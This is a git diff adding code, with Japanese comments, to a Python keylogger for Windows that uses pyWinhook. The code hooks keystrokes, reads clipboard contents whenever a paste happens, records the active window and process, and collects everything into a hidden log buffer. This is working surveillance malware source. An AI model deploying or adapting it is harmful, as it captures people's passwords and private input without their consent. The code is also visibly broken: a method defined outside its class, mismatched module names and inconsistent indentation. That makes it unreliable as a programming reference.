@@ -1,3 +1,6 @@
+#pyWinHookが事前にインストールされてる前提でコードを書きます。インストールしていない方は
+# pip install pyWinhook
+#でインストールしてください。
 from ctypes import byref, create_string_buffer, c_ulong, windll
 from io import StringIO
 
@@ -29,3 +32,46 @@ class KeyLogger:
     windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
     try:
       self.current_window = window_title.value.decode()
+    except UnicodeDecodeError as e:
+      print(f'{e}: window name unknown')
+      print('¥n', process_id, executable.value.decode(), self.current_window)
+
+      windll.kernel32.CloseHandle(hwnd)
+      windll.kernel32.CloseHandle(h_process)
+
+#ここまでで定数TIMEOUTを定義し、新しいクラスKeyLoggerを作成　その他処理<-書くのめんどい
+
+def mykeystroke(self, event):
+  if event.WindowName != self.current_window:
+    self.get_current_process()
+  if 32 < event.Ascii < 127:
+    print(chr(event.Ascii), end='')
+  else:
+    if event.Key == 'V':
+      win32clipboard.OpenClipboard()
+      value = win32clipboard.GetClipboardData()
+      win32clipboard.CloseClipboard()
+      print(f'[PASTE] - {value}')
+    else:
+      print(f'{event.Key}')
+  return True
+
+def run():
+  save_stdout = sys.stdout
+  sys.stdout = StringIO()
+
+  kl = KeyLogger()
+  hm = pyHook.HookManager()
+  hm.KeyDown = kl.mykeystroke
+  hm.HookKeyboard()
+  while time.thread_time() < TIMEOUT:
+    pythoncom.PumpWaitingMessages()
+
+  log = sys.stdout.getvalue()
+  sys.stdout = save_stdout
+  return log
+
+
+if __name__ == '__main__':
+  print(run())
+  print('done.')
